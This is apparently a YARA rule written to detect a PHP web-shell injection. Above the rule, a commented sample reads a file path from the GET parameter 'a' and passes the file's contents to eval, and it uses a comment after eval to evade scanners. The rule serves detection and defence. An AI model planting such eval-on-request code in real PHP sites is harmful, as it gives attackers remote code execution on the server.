//   
//          { header('Content-Type: text/html; charset=Windows-1251');
//          $p=$_GET['a']; echo eval/**/
//          ('?>'.join("",file("news/file/system/$p")).'<?'); die; }
//
//

rule eval_get_a: phpshell inj
{
    meta:
        description = "test_eval_evasion.yar rule matched"
        author = "delyee"
        date = "24.04.2020"
    strings:
        $ = "$_GET['a']; echo eval/**/"
        $ = "('?>'.join("
        $ = "header("
    condition:
        all of them
}
